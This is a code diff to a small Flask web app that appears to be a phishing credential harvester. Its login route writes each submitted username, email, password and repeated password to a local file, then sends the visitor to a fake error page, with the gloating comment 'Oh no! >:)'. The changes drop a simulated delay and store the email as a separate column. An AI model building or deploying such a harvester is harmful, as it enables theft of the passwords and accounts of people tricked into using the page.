@@ -2,7 +2,6 @@
 
 from os.path import join, dirname, abspath
 from flask import Flask, render_template, request, redirect
-from time import sleep
 import json
 
 
@@ -28,7 +27,6 @@ def root():
 @app.route('/login', methods = ['POST'])
 def login():
     save_credentials(request.form)
-    sleep(3) # Simulating some internet related delay
     return redirect('/error') # Oh no! >:)
 
 @app.route('/<page>')
@@ -52,13 +50,13 @@ def save_credentials(form):
     type = form.get('type')
     username = form.get('username')
     email = form.get('email')
-    username += ':' + email if email else ''
     password = form.get('password')
     repeat = form.get('repeat')
     f = open(credentials, 'a')
-    f.write("%s,%s,%s,%s\n" % (
+    f.write("%s,%s,%s,%s,%s\n" % (
         type,
         username,
+        email,
         password,
         repeat
     ))
